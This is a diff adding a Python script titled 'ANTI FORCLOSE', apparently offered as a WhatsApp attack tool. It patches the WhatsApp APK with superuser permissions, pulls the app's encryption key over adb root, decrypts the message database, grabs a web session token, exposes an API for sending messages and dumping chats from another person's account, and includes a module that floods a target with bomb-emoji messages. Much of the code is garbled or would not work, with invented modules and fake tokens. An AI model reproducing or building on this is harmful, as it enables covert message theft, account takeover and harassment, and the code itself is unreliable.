@@ -1,0 +1,90 @@
+nama=ANTI FORCLOSE
+language=python
+lines=86
+date=26/11/2025
+code=# -*- coding: utf-8 -*-
+import os,sys,time,re,subprocess,base64,json,requests,sqlite3,threading,pysqlcipher3.dbapi2 as sqlcipher
+from Cryptodome.Cipher import AES
+from pyaxmlparser import APK
+from whatsapp_backup_reader import WhatsAppDB
+from flask import Flask, request, jsonify
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from pyvirtualdisplay import Display
+
+# 0. CONFIG
+SESSION_DIR = "sessions"
+HOOK_PORT   = 8080
+APK_URL     = "https://www.whatsapp.com/android/current/WhatsApp.apk"
+PKG_NAME    = "com.whatsapp"
+ADB_PATH    = "adb"
+
+# 1. AUTO-PATCH APK
+def patch_apk():
+    r = requests.get(APK_URL)
+    open("wa.apk","wb").write(r.content)
+    a = APK("wa.apk")
+    a.package = PKG_NAME + ".pivot"
+    a.version_name += ".debug"
+    a.permissions += ["android.permission.READ_LOGS","android.permission.ACCESS_SUPERUSER"]
+    a.save("wa_patched.apk")
+    subprocess.run([ADB_PATH,"install","-r","wa_patched.apk"])
+
+# 2. ROOT SHELL & EXTRACT KEY
+def pull_key():
+    os.system(f"{ADB_PATH} shell su -c 'cp /data/data/{PKG_NAME}/files/key /sdcard/'")
+    os.system(f"{ADB_PATH} pull /sdcard/key key")
+    with open("key","rb") as f: key = f.read()
+    return key
+
+# 3. DECRYPT MSGSTORE
+def decrypt_db(key):
+    db = "msgstore.db.crypt15"
+    os.system(f"{ADB_PATH} pull /sdcard/WhatsApp/Databases/{db} .")
+    iv = b"1234567890123456"
+    cipher = AES.new(key[-32:], AES.MODE_CBC, iv)
+    with open(db,"rb") as f: data = cipher.decrypt(f.read())
+    with open("msgstore_plain.db","wb") as o: o.write(data)
+
+# 4. BACKDOOR WEB SESSION
+def hook_qr():
+    opts = Options()
+    opts.add_argument("--headless")
+    driver = webdriver.Chrome(options=opts)
+    driver.get("https://web.whatsapp.com")
+    while "WAToken1" not in driver.page_source: time.sleep(1)
+    token = driver.execute_script("return window.WAToken1")
+    return token
+
+# 5. FLASK API FOR REMOTE CONTROL
+app = Flask(__name__)
+@app.route("/send", methods=["POST"])
+def send():
+    to = request.json["to"]
+    msg = request.json["msg"]
+    driver.find_element(By.CSS_SELECTOR,'[title="'+to+'"]').click()
+    driver.find_element(By.CSS_SELECTOR,'[data-tab="1"]').send_keys(msg+"\n")
+    return jsonify({"status":"sent"})
+
+@app.route("/dump")
+def dump():
+    conn = sqlcipher.connect("msgstore_plain.db")
+    conn.execute("PRAGMA key='"+pull_key().hex()+"'")
+    msgs = conn.execute("SELECT data FROM messages LIMIT 100").fetchall()
+    return jsonify(msgs)
+
+# 6. SPAM & CRASH MODULE
+def crash(target):
+    for i in range(100):
+        requests.post(f"http://localhost:{HOOK_PORT}/send",
+                      json={"to":target,"msg":("💣"*5000)+str(i)})
+
+# 7. AUTO-START
+if __name__=="__main__":
+    patch_apk()
+    key = pull_key()
+    decrypt_db(key)
+    token = hook_qr()
+    threading.Thread(target=lambda: app.run(port=HOOK_PORT)).start()
+    print("API up – use /send and /dump")
